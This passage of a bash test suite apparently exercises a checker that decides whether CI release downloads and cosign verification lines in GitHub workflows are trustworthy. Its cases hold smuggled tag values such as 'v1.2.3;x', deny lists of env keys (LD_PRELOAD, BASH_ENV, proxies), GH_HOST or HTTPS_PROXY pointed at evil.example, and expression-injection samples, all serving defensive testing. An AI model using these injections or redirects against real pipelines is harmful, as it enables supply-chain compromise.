ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -D "$d"' 1 'a non-literal -D path ("$d") is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -D a -D b' 1 'a second -D is refused'
for dd in /etc / . ../x -x /tmp/../etc /home/runner/x /tmp a/../b ./x '~/x'; do
  ghcase "$CHK"$'\n' "gh release download \"\$ver\" --repo \"\$GITHUB_REPOSITORY\" -p manifest.json -D $dd" 1 "F7: -D $dd is refused"
done
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json -D /tmp/release-files-draft' 0 'control (F7): -D /tmp/<name> passes'
ghcase "$CHK"$'\n' 'gh release download "$tag" --repo "$GITHUB_REPOSITORY" -p manifest.json' 1 'another tag variable ("$tag") is refused'
ghcase "$CHK"$'\n' 'gh release download $ver --repo "$GITHUB_REPOSITORY" -p manifest.json' 1 'the tag unquoted ($ver) is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json >"$log"' 1 'a redirect after the command is refused'
ghcase "$CHK"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json && echo ok' 1 'another command on the line is refused'
ghcase '' "$GHD" 1 '$ver unchecked (no tag-pattern test in the step) is refused'
ghcase "$CHK"$'\necho fetching\n' "$GHD" 1 'a tag check that is not the line IMMEDIATELY before the download is refused'
ifrepo ifga "${SUPPORT[@]}" head bin/rel.sh "$PRE$GHD"$'\n'"$CHK"$'\n'
ifx "$work/if-g.json" plain "$(ifrow bin/rel.sh "$GHD" repo:self)"; ifck ifga "$work/if-g.json"
CASE="AC19 (repo:self): a tag check AFTER the download is refused: exit 1, named"
check test "$rc" -eq 1; check grep -q 'not a check of \$ver' "$work/if.out"
ghcase '[[ "$ver" =~ "^v[0-9]+\.[0-9]+\.[0-9]+$" ]] || exit 1'$'\n' "$GHD" 1 'a QUOTED pattern (a literal string match in bash) is refused'
ghcase '[[ "$ver" =~ ^v.*$ ]] || exit 1'$'\n' "$GHD" 1 'a loose pattern (^v.*$) is refused'
ghcase '[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || true'$'\n' "$GHD" 1 'a check that does not exit (|| true) is refused'
ghcase '[[ "$tag" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || exit 1'$'\n' "$GHD" 1 'a check of another variable is refused'
ghcase $'cat <<\'EOF\'\n'"$CHK"$'\nEOF\n'"$CHK"$'\n' "$GHD" 1 'a heredoc before the download in the step is refused'
ghcase $'echo \\\n'"$CHK"$'\n' "$GHD" 1 'a check line that continues the line before it is refused'
ghcase $'echo "\n'"$CHK"$'\n' "$GHD" 1 'an unbalanced quote before the check is refused'
ifrepo ifgc "${SUPPORT[@]}" head bin/rel.sh "$PRE$CHK"$'\ngh release download "$ver" \\\n--repo "$GITHUB_REPOSITORY" -p manifest.json\n'
ifx "$work/if-g.json" plain "$(ifrow bin/rel.sh 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json' repo:self)"; ifck ifgc "$work/if-g.json"
CASE="AC19 (repo:self): a download joined from a backslash-newline continuation is refused though the row names the joined line: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0
# F6: the step text before the check may hold only the closed list of lines; anything else (a function, an alias, PATH, set +e, a trap, ...) refuses
for pre in 'gh() { :; }' 'exit() { :; }' 'alias gh=true' 'shopt -s expand_aliases' 'PATH=/tmp:$PATH' 'export PATH=/tmp' 'set +e' "trap '' ERR" 'unset -f gh' \
  'echo x ||' 'if true; then' 'ver="$(cat /tmp/v)"' 'ver=$VER' 'ver="$1"' 'ver="$HOME"' 'mkdir -p "$d"' 'mkdir -p /tmp/a b; sh x' 'source ./x.sh' '. ./x.sh' 'BASH_ENV=/tmp/x' 'echo hello'; do
  ghcase "$pre"$'\n'"$CHK"$'\n' "$GHD" 1 "F6: '$pre' in the step before the check is refused"
done
# -p names holding ${ver} (the coordinator's reading of the amendment, Oct 10): the line and the check of pull request 276
GH276='gh release download "$ver" --repo "$GITHUB_REPOSITORY" -D /tmp/release-files-draft -p release-files.sha256 -p release-files.sha256.bundle -p release-manifest.json -p fosterstack-cache.openvex.json -p "fosterstack-cache-${ver}.csaf.json" -p "fosterstack-cache-${ver}.inspector-filters.json"'
CHK276='[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]] || { echo "::error::unexpected release tag" >&2; exit 1; }'
ghcase "$CHK276"$'\n' "$GH276" 0 'control: the line and the check of pull request 276 (-p names holding ${ver}) pass'
ghcase '' "$GH276" 1 'the line of pull request 276 with no tag check before it is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-${other}.csaf.json"' 1 'a -p name holding another variable (${other}) is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-${ver}*.json"' 1 'a -p name holding ${ver} AND a glob is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p fosterstack-cache-${ver}.csaf.json' 1 'a -p name holding ${ver} without double quotes is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-$ver.csaf.json"' 1 'a -p name holding an unbraced $ver is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "fosterstack-cache-${ver:-x}.csaf.json"' 1 'a -p name holding ${ver:-x} is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "$(echo x).json"' 1 'a -p name holding a command substitution is refused'
ghcase "$CHK276"$'\n' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p "manifest.json"' 0 'control: a quoted literal -p name passes'
# the step shape pull request 276 will use: the download in its OWN workflow step
STEP276=$'      - name: Fetch the draft release files\n        env:\n          GH_TOKEN: ${{ github.token }}\n          VER: ${{ github.ref_name }}\n        run: |\n          set -euo pipefail\n          ver="$VER"\n          mkdir -p /tmp/release-files-draft\n          '"$CHK276"$'\n          '"$GH276"
ghwf() { # STEPS-YAML EXPECTED-RC WHY
  ifrepo ifw "${SUPPORT[@]}" head .github/workflows/rel.yml "$(wfr "$1")"
  ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GH276" repo:self)"; ifck ifw "$work/if-w.json"
  CASE="AC19 (repo:self, workflow): $3: exit $2"
  check test "$rc" -eq "$2"
}
ghwf "$STEP276" 0 'control: the step shape of pull request 276 (own step; env GH_TOKEN and VER; set, ver="$VER", mkdir -p, the check, the download) passes'
ghwf "${STEP276/        run: |/        shell: python${NL}        run: |}" 1 'the same step with shell: python is refused'
ghwf "${STEP276/          VER:/          BASH_ENV: \/tmp\/x${NL}          VER:}" 1 'the same step with BASH_ENV in its env: is refused'
ghwf $'      - run: |\n          ver=x\n          '"$CHK276"$'\n      - run: |\n          '"$GH276" 1 'the check in ANOTHER step is refused'
ghwf "${STEP276/          mkdir -p/          gh() { :; }${NL}          mkdir -p}" 1 'a function defined in the step before the check is refused'
# Sonnet R2 F5: the message of the tag check (and of die) holds only letters, digits, space and . , : _ - (a # would comment out the exit)
for c in '#' '"' "'" '~' '!' '$' '\' '`' '%' '@' '=' ';' '&' '(' '<'; do
  ghcase "[[ \"\$ver\" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+\$ ]] || { echo bad${c}x >&2; exit 1; }"$'\n' "$GHD" 1 "R2 F5: the character $c in the { echo MSG; exit N; } message is refused"
done
ghcase '[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo bad #; exit 1; }'$'\n' "$GHD" 1 'R2 F5: a # that comments out ; exit 1; } is refused'
ghcase 'if [[ ! "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo bad #; exit 1; fi'$'\n' "$GHD" 1 'R2 F5: a # in the if form message is refused'
ghcase '[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo "bad >&2; exit 1; }'$'\n' "$GHD" 1 'R2 F5: an unbalanced quote in the message is refused'
ghcase '[[ "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo bad >&2; exit 1;'$'\n' "$GHD" 1 'R2 F5: a check whose closing } is not on the same line is refused'
hostcase "$C $O $U"' || die "bad # x" 1' 1 'R2 F5: a # in a die message is refused'
hostcase "$C $O $U"' || die "bad=x" 1' 1 'R2 F5: an = in a die message is refused'
# R2 F5 end to end: the accepted check forms, run by bash with a stub gh, download for a release tag and stop (exit 1, no download) for anything else
mkdir -p "$work/e2e/bin"; printf '#!/bin/sh\necho "gh $*" >>"$E2E_LOG"\n' >"$work/e2e/bin/gh"; chmod +x "$work/e2e/bin/gh"
e2e() { # CHECK-LINE VER EXPECTED-RC EXPECTED-CALLS WHY
  printf '%s\n' '#!/bin/bash' 'set -euo pipefail' 'ver="$VER"' "$1" 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json' >"$work/e2e/run.sh"
  : >"$work/e2e/log"; rc=0; env -i PATH="$work/e2e/bin:/usr/bin:/bin" VER="$2" GITHUB_REPOSITORY=o/r E2E_LOG="$work/e2e/log" bash "$work/e2e/run.sh" </dev/null >/dev/null 2>&1 || rc=$?
  CASE="AC19 (repo:self, R2 F5 end to end): $5 (ver=$2): exit $3, $4 download(s)"
  check test "$rc" -eq "$3"; check test "$(wc -l <"$work/e2e/log" | tr -d ' ')" -eq "$4"
}
for form in "$CHK" "$CHK276" 'if [[ ! "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]]; then echo bad tag >&2; exit 1; fi' '[[ $ver =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]] || exit 1'; do
  for good in v1.2.3 v10.0.1; do e2e "$form" "$good" 0 1 "${form:0:40}"; done
  for evil in 'v1.2.3;x' 'v1.2' 'main' '' 'v1.2.3 x' $'v1.2.3\nx' '-rc.1' '../v1.2.3'; do e2e "$form" "$evil" 1 0 "${form:0:40}"; done
done
hostpre() { # PREFIX-LINES LINE EXPECTED-RC WHY: bin/fetch.sh = FETCH, PREFIX-LINES, LINE; the row names LINE
  ifrepo ifh "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$1$2"$'\n'
  ifx "$work/if-h.json" plain "$(ifrow bin/fetch.sh "$2" "$HOSTN")"; ifck ifh "$work/if-h.json"
  CASE="AC19 (host row): $4: exit $3"
  check test "$rc" -eq "$3"; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq 0; check grep -q 'input fetch not verified' "$work/if.out"
}
# Sonnet R2 F4: any << this reader does not recognise (not the exact python3 opener at the start of a line) makes the file rule nothing
ghcase $'# n <<\'true\'\nexport GITHUB_REPOSITORY=evil/x\nexit() { :; }\ntrue\n'"$CHK"$'\n' "$GHD" 1 'R2 F4: the Sonnet reproduction (a << in a comment hiding export, exit() and true from the step whitelist) is refused'
hostpre "x=\$((1<<2))"$'\n' "$LIT" 1 'R2 F4: a << the reader does not recognise ($((1<<2))) in the file refuses its rulings'
hostpre $'cat <<\'EOF\'\nhello\nEOF\n' "$LIT" 1 'R2 F4: a data heredoc anywhere in the file refuses its rulings'
hostpre $'echo x <<<"y"\n' "$LIT" 1 'R2 F4: a here-string in the file refuses its rulings'
pycase "$PYF" 1 'R2 F4: a python3 opener after a comment (# x; python3 ...) is refused' "# x; python3 - \"\$tmp\" <<'PY'"
pycase "$PYF" 1 'R2 F4: a python3 opener after another command (x=1; python3 ...) is refused' "x=1; python3 - \"\$tmp\" <<'PY'"
pycase "$PYF" 1 'R2 F4: a python3 opener with an argument outside the closed list is refused' "python3 - \$tmp <<'PY'"
pycase "$PYF" 0 'R2 F4 control: the P3 opener shape python3 - "$a" "$(cd "$(dirname "$0")" && pwd)" <<'"'PY'"' || exit $? passes' "python3 - \"\$a\" \"\$(cd \"\$(dirname \"\$0\")\" && pwd)\" <<'PY' || exit \$?"
# Sonnet R2 F6: ${{ }} is expanded by GitHub BEFORE bash: none in the ruled step's run: text (env: values are not script text)
ghwf "${STEP276/          mkdir -p/          # \${{ github.event.pull_request.body }}${NL}          mkdir -p}" 1 'R2 F6: ${{ }} in a comment of the ruled step is refused'
ghwf "${STEP276/          mkdir -p/          echo \"\${{ github.ref_name }}\"${NL}          mkdir -p}" 1 'R2 F6: ${{ }} anywhere in the ruled step run: text is refused'
wfcase "      - run: |"$'\n'"          # \${{ github.event.issue.title }}"$'\n'"          $LIT" 1 'R2 F6: ${{ }} in the run: block of a ruled curl line is refused'
hostpre "# \${{ github.token }}"$'\n' "$LIT" 1 'R2 F6: ${{ in a .sh file holding a ruled line is refused'
# Sonnet R2 R-A: a workflow whose env: (step, job or workflow level) sets a proxy, a CA bundle, a gh host, a shell or loader variable rules nothing
ghwf "${STEP276/          VER:/          SHELLOPTS: xtrace${NL}          VER:}" 1 "the step env: setting SHELLOPTS is refused"
for key in HTTP_PROXY HTTPS_PROXY ALL_PROXY NO_PROXY http_proxy https_proxy all_proxy CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME XDG_CONFIG_HOME GH_HOST GH_REPO GH_ENTERPRISE_TOKEN BASH_ENV ENV PATH LD_PRELOAD LD_LIBRARY_PATH PYTHONPATH PYTHONSTARTUP PYTHONHOME PYTHONUSERBASE; do
  ghwf "${STEP276/          VER:/          $key: x${NL}          VER:}" 1 "R-A: the step env: setting $key is refused"
done
ifrepo ifwj "${SUPPORT[@]}" head .github/workflows/rel.yml "$(printf 'on: push\nenv:\n  GH_HOST: evil.example\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n%s\n' "$STEP276")"
ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GH276" repo:self)"; ifck ifwj "$work/if-w.json"
CASE="AC19 (repo:self, workflow, R-A): a workflow-level env: GH_HOST is refused: exit 1"
check test "$rc" -eq 1; check grep -q 'GH_HOST' "$work/if.out"
ifrepo ifwj2 "${SUPPORT[@]}" head .github/workflows/rel.yml "$(printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      HTTPS_PROXY: http://evil.example\n    steps:\n%s\n' "$STEP276")"
ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GH276" repo:self)"; ifck ifwj2 "$work/if-w.json"
CASE="AC19 (repo:self, workflow, R-A): a job-level env: HTTPS_PROXY is refused: exit 1"
check test "$rc" -eq 1; check grep -q 'HTTPS_PROXY' "$work/if.out"
wfcase "      - env:"$'\n'"          CURL_CA_BUNDLE: /tmp/ca"$'\n'"        run: |"$'\n'"          $LIT" 1 'R-A: a curl step whose env: sets CURL_CA_BUNDLE is refused'
# A workflow or action as a VERIFIER file (the #276 helper, Oct 10): the line form only, the line a physical line of a bash run: block of that file
# (not a comment, not an env:/with: value, not in a run: block holding a <<); a function verifier stays .sh/.py/.go. The #276 curl line (final shape:
# --proto =https added) is a redirects row, so its verifier line must run cosign verify-blob with the identity and issuer on that same physical line.
CURL276='if curl -q -fsSL -g --proto =https --proto-redir =https --max-redirs 3 --connect-timeout 20 --max-time 120 -o "$dest" "https://github.com/${GITHUB_REPOSITORY}/releases/download/${ver}/${f}"; then ok=1; break; fi'
VLINE='cosign verify-blob --bundle "$dest.bundle" --certificate-identity "https://github.com/o/r/.github/workflows/stage-promote.yml@refs/heads/main" --certificate-oidc-issuer https://token.actions.githubusercontent.com "$dest"'
VIDF='cosign verify-blob --bundle "$dest.bundle" "${idflags[@]}" "$dest" \'
yv() { python3 -c 'import json,sys; print(json.dumps({"file": ".github/workflows/sp.yml", "line": sys.argv[1]}))' "$1"; }
yvcase() { # WORKFLOW-STEPS FETCH-LINE ROW-HOST VERIFIER-LINE REDIRECTS(true|-) EXPECTED-RC WHY
  ifrepo ify "${SUPPORT[@]}" head .github/workflows/sp.yml "$(wfr "$1")"
  local ov; if [ "$5" = true ]; then ov="{\"redirects\": true, \"verifier\": $(yv "$4")}"; else ov="{\"verifier\": $(yv "$4")}"; fi
  ifx "$work/if-y.json" plain "$(ifrow .github/workflows/sp.yml "$2" "$3" "$ov")"; ifck ify "$work/if-y.json"
  CASE="AC19 (workflow verifier line): $7: exit $6"
  check test "$rc" -eq "$6"; if [ "$6" -ne 0 ]; then check grep -q 'input fetch not verified' "$work/if.out"; fi
}
FSTEP="      - run: |"$'\n'"          for f in a b; do"$'\n'"            dest=\"\$pub/\${f}\""$'\n'"            $CURL276"$'\n'"          done"
VSTEP="      - run: |"$'\n'"          $VLINE"
yvcase "$FSTEP"$'\n'"$VSTEP" "$CURL276" github.com "$VLINE" true 0 'control: the #276 curl line (redirects row) with a cosign verify-blob line carrying identity and issuer in a run: block passes'
yvcase "$FSTEP"$'\n'"      - run: |"$'\n'"          $VIDF" "$CURL276" github.com "$VIDF" true 1 'a redirects row whose verifier line uses "${idflags[@]}" (flags not on the line) is refused'
yvcase "$FSTEP"$'\n'"      - run: |"$'\n'"          # $VLINE"$'\n'"          true" "$CURL276" github.com "# $VLINE" true 1 'a verifier line that is a comment in the run: block is refused'
yvcase "$FSTEP"$'\n'"      - env:"$'\n'"          V: '$VLINE'"$'\n'"        run: |"$'\n'"          true" "$CURL276" github.com "$VLINE" true 1 'a verifier line found only in an env: value is refused'
yvcase "$FSTEP"$'\n'"      - name: v"$'\n'"        with:"$'\n'"          script: '$VLINE'" "$CURL276" github.com "$VLINE" true 1 'a verifier line found only in a with: value (not a run: block) is refused'
yvcase "$FSTEP"$'\n'"      - run: |"$'\n'"          cat >/dev/null <<EOF"$'\n'"          $VLINE"$'\n'"          EOF" "$CURL276" github.com "$VLINE" true 1 'a verifier line inside a heredoc in the run: block is refused'
yvcase "$FSTEP"$'\n'"      - shell: python"$'\n'"        run: |"$'\n'"          $VLINE" "$CURL276" github.com "$VLINE" true 1 'a verifier line in a run: block whose file sets shell: python is refused'
# repo:self (no redirects): a cosign verify-blob line with "${idflags[@]}" is an acceptable verifier line (the signature rule binds redirects rows only)
yvcase "$STEP276"$'\n'"      - run: |"$'\n'"          $VIDF"$'\n'"            --output-signature x" "$GH276" repo:self "$VIDF" - 0 'control: the #276 draft download (repo:self) verified by a cosign verify-blob line using "${idflags[@]}" ending in a backslash passes'
ifx "$work/if-bad.json" plain "$(ifrow bin/fetch.sh "$LIT" "$HOSTN" '{"verifier": {"file": ".github/workflows/sp.yml", "function": "verify"}}')" "$RKEY"; ifck ifm "$work/if-bad.json"
CASE="AC19 (workflow verifier): a FUNCTION verifier in a workflow file stops the check (exit 2): only the line form may name a workflow or action"
check test "$rc" -eq 2; check grep -q 'unmeasured_input_fetch' "$work/if.out"
ifrepo ifvc "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n'"# sha256sum -c x || exit 1"$'\n'
vtcase '{"verifier": {"file": "bin/fetch.sh", "line": "# sha256sum -c x || exit 1"}}' 'a verifier line that is a comment in a .sh file' ifvc
# --- Sonnet round 3 -----------------------------------------------------------------------------------------------------------------------------------
# B1: a signature verifier is cosign verify-blob as the COMMAND words of a simple command (quote-aware), never text in a string, an assignment or an echo
vjf() { python3 -c 'import json,sys; print(json.dumps({"file": sys.argv[2], "line": sys.argv[1]}))' "$1" "$2"; }
SIGW='--bundle b --certificate-identity x --certificate-oidc-issuer https://i out'
for L in "echo \"x; cosign verify-blob $SIGW\"" "x=\"a; cosign verify-blob $SIGW\"" "echo 'cosign verify-blob $SIGW'" "printf '%s\\n' \"cosign verify-blob $SIGW\""; do
  sigcase "#!/bin/sh"$'\n'"$L"$'\n' "$(vj "$L")" 1 "B1: the line verifier $L (the command only as text) is refused"
done
sigcase $'#!/bin/sh\nvs() { echo "; cosign verify-blob --certificate-identity x --certificate-oidc-issuer y"; }\n' "$VF" 1 'B1: a function that only echoes "; cosign verify-blob ..." is refused'
sigcase $'#!/bin/sh\nvs() {\n  x="\n  cosign verify-blob --certificate-identity x --certificate-oidc-issuer y out\n  "\n  sha256sum -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'B1: the command inside a multi-line quoted string (no heredoc) is refused'
sigcase $'#!/bin/sh\nvs() {\n  cosign verify-blob --insecure-ignore-tlog --bundle b --certificate-identity x --certificate-oidc-issuer y "$1" || exit 1\n}\n' "$VF" 1 'B1: cosign verify-blob with --insecure-ignore-tlog is refused'
sigcase $'#!/bin/sh\nvs() {\n  cosign verify-blob --insecure-ignore-sct=true --bundle b --certificate-identity x --certificate-oidc-issuer y "$1" || exit 1\n}\n' "$VF" 1 'B1: cosign verify-blob with --insecure-ignore-sct is refused'
sigcase "cosign verify-blob $SIGW"$'\n' "$(vjf "cosign verify-blob $SIGW" bin/v2.py)" 1 'B1: a LINE verifier in a .py file for a redirects row is refused' bin/v2.py
sigcase "cosign verify-blob $SIGW"$'\n' "$(vjf "cosign verify-blob $SIGW" bin/v2.go)" 1 'B1: a LINE verifier in a .go file for a redirects row is refused' bin/v2.go
PYS='["cosign", "verify-blob", "--bundle", p + ".b", "--certificate-identity", "x", "--certificate-oidc-issuer", "y", p]'
pysig() { sigcase $'#!/bin/sh\npython3 - <<\'PY\'\nimport subprocess\ndef vs(p):\n'"$1"$'\n    raise SystemExit(1)\nPY\n' "$VF" "$2" "$3"; }
pysig "    print($PYS)" 1 'B1: a Python def that prints the cosign list is refused'
pysig "    n = len($PYS)" 1 'B1: a Python def that takes len() of the cosign list is refused'
pysig "    x = lambda: subprocess.run($PYS)" 1 'B1: a Python def that only builds a lambda calling cosign is refused'
pysig "    run = subprocess.run"$'\n'"    run($PYS)" 1 'B1: a Python call through an alias of subprocess.run is refused'
pysig "    subprocess.check_call([cosign_bin, \"cosign\", \"verify-blob\", \"--certificate-identity\", \"x\", \"--certificate-oidc-issuer\", \"y\", p])" 1 'B1: a list whose FIRST items are not the literals "cosign", "verify-blob" is refused'
pysig "    subprocess.check_call($PYS)" 0 'B1 control: subprocess.check_call of the cosign list as a statement passes'
pysig "    r = subprocess.run($PYS, check=True)" 0 'B1 control: r = subprocess.run(cosign list) as a statement passes'
# B2: a run: block is jobs.<id>.steps[*].run (workflow) or runs.steps[*].run with shell: bash (composite action), nothing else named run
wfcase "      - name: s"$'\n'"        with:"$'\n'"          run: |"$'\n'"            $LIT" 1 'B2: the fetch line under with: run: (not a step run:) is refused'
wfcase "      - name: s"$'\n'"        env:"$'\n'"          run: x"$'\n'"        run: |"$'\n'"          $LIT" 0 'B2 control: a key named run under env: does not stop the real run: block'
yvcase "$FSTEP"$'\n'"      - name: v"$'\n'"        with:"$'\n'"          run: '$VLINE'" "$CURL276" github.com "$VLINE" true 1 'B2: a verifier line under with: run: is refused'
ifrepo ifwin "${SUPPORT[@]}" head .github/workflows/f.yml "$(printf 'on: push\njobs:\n  j:\n    runs-on: windows-latest\n    steps:\n      - run: |\n          %s\n' "$LIT")"
ifx "$work/if-wf.json" plain "$(ifrow .github/workflows/f.yml "$LIT" "$HOSTN")"; ifck ifwin "$work/if-wf.json"
CASE="AC19 (B2): a run: step without shell: bash on a windows runner (default shell not bash) is refused: exit 1"
check test "$rc" -eq 1
ifrepo ifmat "${SUPPORT[@]}" head .github/workflows/f.yml "$(printf 'on: push\njobs:\n  j:\n    runs-on: ${{ matrix.os }}\n    steps:\n      - shell: bash\n        run: |\n          %s\n' "$LIT")"
ifx "$work/if-wf.json" plain "$(ifrow .github/workflows/f.yml "$LIT" "$HOSTN")"; ifck ifmat "$work/if-wf.json"
CASE="AC19 (B2) control: a runs-on expression with an explicit shell: bash step passes: exit 0"
check test "$rc" -eq 0
actcase() { # ACTION-STEPS EXPECTED-RC WHY
  ifrepo ifa "${SUPPORT[@]}" head .github/actions/f/action.yml "$(printf 'name: f\nruns:\n  using: composite\n  steps:\n%s\n' "$1")"
  ifx "$work/if-a.json" plain "$(ifrow .github/actions/f/action.yml "$LIT" "$HOSTN")"; ifck ifa "$work/if-a.json"
  CASE="AC19 (composite action, B2/B3): $3: exit $2"
  check test "$rc" -eq "$2"
}
actcase "    - shell: bash"$'\n'"      run: |"$'\n'"        $LIT" 0 'control: a composite step with shell: bash passes'
actcase "    - run: |"$'\n'"        $LIT" 1 'a composite step without shell: bash is refused'
# B3: a .sh file holding a repo:self line must start with a bash shebang ([[ is not sh)
ghcase "$CHK"$'\n' "$GHD" 1 'B3: a .sh file whose shebang is #!/bin/sh is refused' $'#!/bin/sh\nset -eu\nver="$VER"\n'
ghcase "$CHK"$'\n' "$GHD" 1 'B3: a .sh file with no shebang is refused' $'set -eu\nver="$VER"\n'
ghcase "$CHK"$'\n' "$GHD" 0 'B3 control: #!/usr/bin/env bash passes' $'#!/usr/bin/env bash\nset -euo pipefail\nver="$VER"\n'
if command -v dash >/dev/null 2>&1; then
  printf '%s\n' '#!/bin/sh' 'ver="$VER"' 'if [[ ! "$ver" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo bad >&2; exit 1; fi' 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" -p manifest.json' >"$work/e2e/dash.sh"
  : >"$work/e2e/log"; rc=0; env -i PATH="$work/e2e/bin:/usr/bin:/bin" VER='evil;x' GITHUB_REPOSITORY=o/r E2E_LOG="$work/e2e/log" dash "$work/e2e/dash.sh" </dev/null >/dev/null 2>&1 || rc=$?
  CASE="AC19 (repo:self, B3 end to end): under dash the if [[ ! ... ]] form fails OPEN (a bad tag downloads): why the bash shebang is required"
  check test "$(wc -l <"$work/e2e/log" | tr -d ' ')" -eq 1
fi
# B4: env: must be a mapping at every level; a repo:self step's env: holds only GH_TOKEN (github.token or secrets.GITHUB_TOKEN) and VER (github.ref_name)
ghwf "${STEP276/          GH_TOKEN:/          GITHUB_REPOSITORY: evil\/x${NL}          GH_TOKEN:}" 1 'B4: the repo:self step env: setting GITHUB_REPOSITORY is refused'
ghwf "${STEP276/          GH_TOKEN:/          GH_CONFIG_DIR: \/tmp\/x${NL}          GH_TOKEN:}" 1 'B4: the repo:self step env: setting GH_CONFIG_DIR is refused'
ghwf "${STEP276/          GH_TOKEN:/          GH_PROMPT_DISABLED: 1${NL}          GH_TOKEN:}" 1 'B4: the repo:self step env: setting GH_PROMPT_DISABLED is refused'
ghwf "${STEP276/\${{ github.token \}\}/\${{ secrets.OTHER \}\}}" 1 'B4: GH_TOKEN from another secret is refused'
ghwf "${STEP276/\${{ github.token \}\}/\${{ secrets.GITHUB_TOKEN \}\}}" 0 'B4 control: GH_TOKEN from secrets.GITHUB_TOKEN passes'
ghwf "${STEP276/\${{ github.ref_name \}\}/\${{ github.event.inputs.v \}\}}" 1 'B4: VER from another expression is refused'
ghwf "${STEP276/        env:/        env: \${{ fromJSON(inputs.e) \}\}${NL}        x-env:}" 1 'B4: a non-mapping step env: (an expression) is refused'
ifrepo ifwn "${SUPPORT[@]}" head .github/workflows/rel.yml "$(printf 'on: push\nenv: ${{ fromJSON(inputs.e) }}\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n%s\n' "$STEP276")"
ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GH276" repo:self)"; ifck ifwn "$work/if-w.json"
CASE="AC19 (B4): a non-mapping workflow-level env: is refused: exit 1"
check test "$rc" -eq 1; check grep -q 'input fetch not verified' "$work/if.out"
ifrepo ifwg "${SUPPORT[@]}" head .github/workflows/rel.yml "$(printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    env:\n      GIT_SSH_COMMAND: x\n    steps:\n%s\n' "$STEP276")"
ifx "$work/if-w.json" plain "$(ifrow .github/workflows/rel.yml "$GH276" repo:self)"; ifck ifwg "$work/if-w.json"
CASE="AC19 (B4): a job-level env: GIT_* key is refused: exit 1"
check test "$rc" -eq 1; check grep -q 'GIT_SSH_COMMAND' "$work/if.out"
for key in SIGSTORE_ROOT_FILE TUF_ROOT GH_HOST_X SSL_X OPENSSL_CONF DYLD_INSERT_LIBRARIES; do
  wfcase "      - env:"$'\n'"          $key: x"$'\n'"        run: |"$'\n'"          $LIT" 1 "B4: a curl step whose env: sets $key is refused"
done
wfcase "      - env:"$'\n'"          - X=1"$'\n'"        run: |"$'\n'"          $LIT" 1 'B4: an env: list is refused'
# round-3 mutants: cases only one layer catches
ifrepo ifdef "${SUPPORT[@]}" head .github/workflows/f.yml "$(printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: python\n    steps:\n      - run: |\n          %s\n' "$LIT")"
ifx "$work/if-wf.json" plain "$(ifrow .github/workflows/f.yml "$LIT" "$HOSTN")"; ifck ifdef "$work/if-wf.json"
CASE="AC19 (B2): a job defaults: run: shell: python (the step has no shell:) is refused: exit 1"
check test "$rc" -eq 1
pysig "    print(subprocess.run($PYS))" 1 'B1: the cosign call as an argument of another call (print) is refused'
sigcase $'#!/bin/sh\nvs() {\n  echo verify-blob --certificate-identity x --certificate-oidc-issuer y\n  sha256sum -c "$1.sha256" || exit 1\n}\n' "$VF" 1 'B1: verify-blob as an unquoted echo argument is refused'
ghwf "${STEP276/          GH_TOKEN:/          FOO: bar${NL}          GH_TOKEN:}" 1 'B4: a repo:self step env: key outside the allow-list (FOO) is refused'
ghwf "${STEP276/\${{ github.ref_name \}\}/\${{ github.token \}\}}" 1 'B4: VER set to ${{ github.token }} (an allowed expression, not VER'"'"'s value) is refused'
